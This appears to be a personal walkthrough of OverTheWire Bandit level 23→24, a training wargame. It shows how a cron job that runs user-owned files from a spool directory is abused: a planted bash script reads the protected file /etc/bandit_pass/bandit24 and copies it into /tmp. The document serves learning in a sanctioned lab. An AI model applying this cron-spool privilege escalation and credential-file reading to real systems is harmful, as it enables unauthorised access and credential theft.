# Bandit Level 23 → Level 24

## 🎯 Objective

Find the password for the next level. A cron job runs a script as the `bandit24` user. The goal is to place a script in the cron directory so that it is executed automatically.

##  Find the Cron Job

First, I checked the cron jobs:

```bash id="qj3gq9"
cd /etc/cron.d
ls
```

I found:

```text id="p3z0cg"
cronjob_bandit24
```

I checked it:

```bash id="f8j7d2"
cat cronjob_bandit24
```

The cron job runs a script as `bandit24`:

```text id="8n7v2k"
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

The script checks files in the `bandit24` spool directory and executes files owned by `bandit23`.

##  Create a Script

I created a simple script in `/tmp`:

```bash id="r0m2c7"
nano /tmp/getpass.sh
```

The script contains:

```bash id="e4p1x8"
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
```

I then made the script executable:

```bash id="f7s4q2"
chmod +x /tmp/getpass.sh
```

##  Copy the Script to the Cron Directory

I copied the script into the directory monitored by the cron job:

```bash id="w6j8v3"
cp /tmp/getpass.sh /var/spool/bandit24/foo/
```

The script is owned by `bandit23`, which satisfies the ownership condition checked by the cron script.

After waiting for the cron job to execute, I checked the output file:

```bash id="k5p9d1"
cat /tmp/bandit24_password
```

This returned the password for **Bandit Level 24**.

##  🧠 What I Learned

* How cron jobs can automatically execute scripts.
* How `/var/spool` can be used by cron jobs.
* How file ownership can be used as a condition before executing a file.
* How to create and execute a Bash script.
* How a script running with another user's privileges can expose protected data.

